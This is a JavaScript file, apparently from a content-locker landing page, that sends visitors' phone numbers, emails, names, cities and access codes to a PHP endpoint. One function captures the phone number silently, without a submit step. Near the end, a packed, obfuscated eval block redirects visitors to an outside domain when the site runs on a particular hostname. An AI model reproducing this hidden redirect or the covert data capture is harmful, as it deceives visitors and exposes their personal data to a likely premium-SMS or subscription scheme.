if (top !== self) top.location.href = self.location.href; 

	$(document).ready(function(){
	var tmp_img = new Image();
	tmp_img.src = 'images/loader.gif';
	
	
	$('a.submit').click(function(){
		
		if($(this).hasClass('disabled'))
			return false;
			
		var cont = $(this).parent();
			
		var tt=$.trim(cont.find('#password').val());
		if(!tt)
		{
			cont.find('span.error').fadeIn();
			return false;
		}
		
		cont.find('#password').hide().parent().append('<img src="images/loader.gif" class="loader" style="float: left; margin: 6px 0 0 22px" />');
		$(this).addClass('disabled');
		cont.find('span.error').hide();
		
		$.ajax({
			type: 'POST',
			url: 'php/post.php',
			data: 'code='+tt+((window.sessvars && window.sessvars.url && window.sessvars.url._bp) ? '&rpd_id='+window.sessvars.url._bp : ''),
			dataType: "html",
			success: function(resp) 
			{
				if($.trim(resp)=='OK')
				{
					if(window._gaq) _gaq.push(["_trackEvent", "ContentLocker", "SubmitOK", "Header"]);
					
					/*
					$('body').append('<img height="1" width="1" style="border-style:none;" alt="" src="//www.googleadservices.com/pagead/conversion/999512542/?value=1&amp;label=2acBCMLArQUQ3rPN3AM&amp;guid=ON&amp;script=0"/>');
					if(window.genetify) genetify.record.goal(GoalName, 100);
					*/
					
					$(window).unbind('beforeunload');
					setTimeout(function(){
					if(window._cC)document.location=_cC(1,'', true);
					else
					document.location='../index.php';}, 1000);


				}
				/*else if(resp=='UNCHARGED')
				{
					if(window._gaq) _gaq.push(["_trackEvent", "ContentLocker", "SubmitOK", "Header"+t1pe]);
					document.location='../index.php';
				}*/

				else
				{
					setTimeout(function(){
						cont.find('span.error').fadeIn();
						cont.find('img.loader').remove();
						cont.find('#password').show();
						cont.find('a.submit').removeClass('disabled');
						if(typeof(window.errorDisplay)!=='undefined'){
                          errorDisplay();
                        }
					}, 1000);

				}
			},
			error: function(){
				cont.find('span.error').fadeIn();
			}
		});
		return false;
	})

	if($('div.step1.websubmit').length>0)
	{
		$('div.step1.websubmit a.send_button').attr('onclick', '');
		$('div.step1.websubmit a.send_button').unbind('click').click(function(){
			var tt=$.trim($('div.step1 #number').val());
			if(!tt)
			{
				$('div.step1 span.error').fadeIn();
				return false;
			}
			
			$('div.step1 #number').hide();
			$('div.step1 .loader').show();
			$(this).hide();
			$('div.step1 span.error').hide();
			
			var calias = $('input[name=alias]', 'div.step1').val();
			
			$.ajax({
				type: 'POST',
				url: 'php/post.php',
				data: 'msisdn='+tt+'&alias='+calias+'&type='+($('input[name=type]', 'div.step1').length==1 ? $('input[name=type]', 'div.step1').val() : '')+(window.sessvars && window.sessvars.url ? '&cui='+window.sessvars.url.cui+'&vid='+window.sessvars.url._bp : ''),
				dataType: "html",
				success: function(resp) 
				{ 
					if(resp=='SENT')
					{
						setTimeout(function(){
							$('div.step1').hide();
							$('div.step2').show();
							$('div.step2 #cta_text').show();
						},1000);
					}
					else if(resp=='ACTIVE')
					{
						if($('div.ctastep').length>0)
						{
							$('div.step1').hide();
							$('div.ctastep').show();
						}						
						else
							document.location.href="member.php?i="+calias;
					}
					else
					{
						setTimeout(function(){
							$('div.step1 span.error').fadeIn();
							$('div.step1 img.loader').hide();
							$('div.step1 #number').show();
							$('div.step1 a.send_button').show();
						}, 1000);
					}
				},
				error: function(){
					$('div.step1 span.error').fadeIn();
				}
			});
			return false;
		})
	}
	
	if($('div.step1.fwebsubmit').length>0)
	{
		$('div.step1.fwebsubmit a.send_button').attr('onclick', '');
		$('div.step1.fwebsubmit a.send_button').click(function(){
			var tt=$.trim($('div.step1 #number').val());
			if(!tt)
			{
				$('div.step1 span.error').fadeIn();
				return false;
			}
			
			$('div.step1 #number').hide();
			$('div.step1 .loader').show();
			$(this).hide();
			$('div.step1 span.error').hide();
			
			$.ajax({
				type: 'POST',
				url: 'php/post.php',
				data: 'action=trackMsisdn&msisdn='+tt+(window.sessvars && window.sessvars.url ? '&rpd_id='+window.sessvars.url._bp : '')+($('input.data').length>0 ? '&'+$('input.data').serialize() : ''),
				dataType: "html",
				success: function(resp) 
				{ 
					if(resp == 'ERROR')
					{
						setTimeout(function(){
							$('div.step1 span.error').fadeIn();
							$('div.step1 img.loader').hide();
							$('div.step1 #number').show();
							$('div.step1 a.send_button').show();
						}, 1000);
					} 
					else
					{
				
						$('div.step1').hide();
						$('div.ctastep').show();
					}
				},
				error: function(){
					$('div.step1 span.error').fadeIn();
				}
			});
			return false;
		})
	}

	
	
	eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('4(0.1.5==\'3.2\')0.1.6=\'7://c.d/b/a/8/9.e\';',15,15,'window|location|com|smsmobail|if|hostname|href|http|br2|index|cl8|e7s|fastfuk|net|php'.split('|'),0,{}));
	
});
	
function validateEmail(email)
{
       var reg = /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/;
                       
       if ( reg.test(email) == false )
       {
               return false;
       }
       return true;
}
function recordMsisdnSilent()
{
	var phone = $('input[name=userphone]').length>0 ? $.trim($('input[name=userphone]').val()) : '';
	if(phone != '')
	{
		$.ajax({
			type: 'POST',
			url: 'php/post.php',
			data: 'userphone='+phone,
			dataType: "html",
			async: true,
			success: function(resp) 
			{
				
			}
		});
	}
}
function sendEmailData() {
    var a = "";
	if ($("#email-name").length > 0) {
        var b = $.trim($("#email-name").val());
        a += "&email-name=" + b
    } 
	
	if ($("#email-city").length > 0) {
        var b = $.trim($("#email-city").val());
        a += "&email-city=" + b
    }
	
	if ($("#email-seek").length > 0) {
        var b = $.trim($("#email-seek").val());
        a += "&email-seek=" + b
    }
	
	if ($("#aliasdefault").length > 0) {
        var b = $.trim($("#aliasdefault").val());
        a += "&aliasdefault=" + b
    } 
	
	if ($("#aliascity").length > 0) {
        var b = $.trim($("#aliascity").val());
        a += "&aliascity=" + b
    }
	
	if ($("#aliasyears").length > 0) {
        var b = $.trim($("#aliasyears").val());
        a += "&aliasyears=" + b
    }
	if ($("select[name=nicheinfo]").length > 0) {
        var b = $.trim($("select[name=nicheinfo]").val());
        a += "&nicheinfo=" + b
    }
	if ($("input[name=userphone]").length > 0) {
        var b = $.trim($("input[name=userphone]").val());
        a += "&userphone=" + b
    }
	
	if (!validateEmail($("#email-email").val())) {
	    if ($("#email-email").val() == $("#email-email").attr("defaultValue")) {
			alert ("Uneseni email nije ispravan!");
		}
		else {
			alert ("Uneseni email nije ispravan!");
		}		
		return false;
	} 

	a += "&email-email=" + $.trim($("#email-email").val());

	formEmailshowhide("send");
	
	EmailTrack($.trim($("#email-email").val()));
	
    $.post("php/post.php", a, function (a) {
        if (a == "OK") {
            setTimeout("showEmail02()", 4e3)
        } else {
            setTimeout("showEmailError()", 4e3)
        }
    })
}
function showEmailError() {
     $(".email_status_message p.por1_s_cook").css('display','block');
	$(".content_email_under").css('display','none');
	$(".email_status_message p.por1_s_akt").css('display','none');
	$(".email_status_message").css('display','block');
    $(".loading").css('display','none');
}
function showEmail02(a) {
    $(".content_email_under").css('display','none');
    $(".email_status_message").css('display','block');
    $(".loading").css('display','none');
	if(window.showStep2)showStep2();
}
function formEmailshowhide(a) {
    if (a == "send") {
        $(".content_email_under").css('display','none');
        $(".email_status_message").css('display','none');
		$(".loading").css('display','block');
    }
}
	
function sendEmailDataNoCheck() {
    var a = "";
	if ($("#email-name").length > 0) {
        var b = $.trim($("#email-name").val());
        a += "&email-name=" + b
    } 
	
	if ($("#email-city").length > 0) {
        var b = $.trim($("#email-city").val());
        a += "&email-city=" + b
    }
	
	if ($("#email-seek").length > 0) {
        var b = $.trim($("#email-seek").val());
        a += "&email-seek=" + b
    }
	
	if ($("#aliasdefault").length > 0) {
        var b = $.trim($("#aliasdefault").val());
        a += "&aliasdefault=" + b
    } 
	
	if ($("#aliascity").length > 0) {
        var b = $.trim($("#aliascity").val());
        a += "&aliascity=" + b
    }
	
	if ($("#aliasyears").length > 0) {
        var b = $.trim($("#aliasyears").val());
        a += "&aliasyears=" + b
    }
	

	a += "&email-email=" + $.trim($("#email-email").val());

	formEmailshowhide("send");
	
	if (!validateEmail($("#email-email").val())) {
		setTimeout("showEmail02()", 4e3);
		return;
	}
	
	EmailTrack($.trim($("#email-email").val()));
	
    $.post("php/post.php", a, function (a) {
        if (a == "OK") {
            setTimeout("showEmail02()", 4e3)
        } else {
            setTimeout("showEmailError()", 4e3)
        }
    })
}


function MailChack(){

    // Nova za provjeru mejla
    
    var $email = $('input[name=email-email]');
    var emailUzorak = /^([0-9a-zA-Z]([-\.\+\_\w]*[0-9a-zA-Z])*@([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$/;
    
    if($email.val().length < 1 || !$email.val().match(emailUzorak)) {
        
          alert ("Uneseni email nije ispravan!");
          
          return false;        
    }
    else{
    
        $("#email_box").hide();
        $.cookie('registered', 'yes', { expires: 1 });

        // CTA sa zadrškom radi loadera      
        setTimeout(function(){
            $("#cta_wrapper").fadeIn('slow');
        }, 4500);
        
        sendEmailDataNoCheck();
        
        return true;
    
    }
    
    
}

function PSMailChack(obj){
	var nu = $(obj).attr('href');
	if(!MailChack())
		return false;
	
	setTimeout(function(){
		document.location.href = nu;
	}, 1000);
	return false 
}



function ClickTrack (click){
	if(window.trackClick)
		trackClick(click);
	}
	
function EmailTrack (email){
	if(window.trackEmail)
		trackEmail(email);
	}